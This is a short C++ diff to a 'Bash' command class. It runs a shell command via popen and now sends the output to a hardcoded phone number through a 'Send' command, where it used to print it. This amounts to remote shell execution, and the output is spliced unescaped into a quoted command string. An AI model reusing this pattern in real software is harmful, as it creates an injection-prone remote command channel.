@@ -6,6 +6,7 @@
  */
 
 #include "Bash.h"
+#include "../Send/Send.h"
 
 Bash::Bash()
 	: ACommand("bash") {
@@ -24,7 +25,7 @@ std::string Bash::exec(const char* cmd) {
 	std::string result = "";
 	while(!feof(pipe)) {
 		if(fgets(buffer, 128, pipe) != NULL)
-		result += buffer;
+			result += buffer;
 	}
 	pclose(pipe);
 	return result;
@@ -35,5 +36,12 @@ void Bash::run(std::string &my_string) {
 	my_string = my_string.substr(5, my_string.size());
 
 	std::string result = exec(my_string.c_str());
-	std::cout << result << "\n";
+	Send send;
+	if(result == "") {
+		std::string command = "send \"done\" to 0762226688";
+		send.run(command);
+	} else {
+		std::string command = "send \"" + result + "\" to 0762226688";
+		send.run(command);
+	}
 }
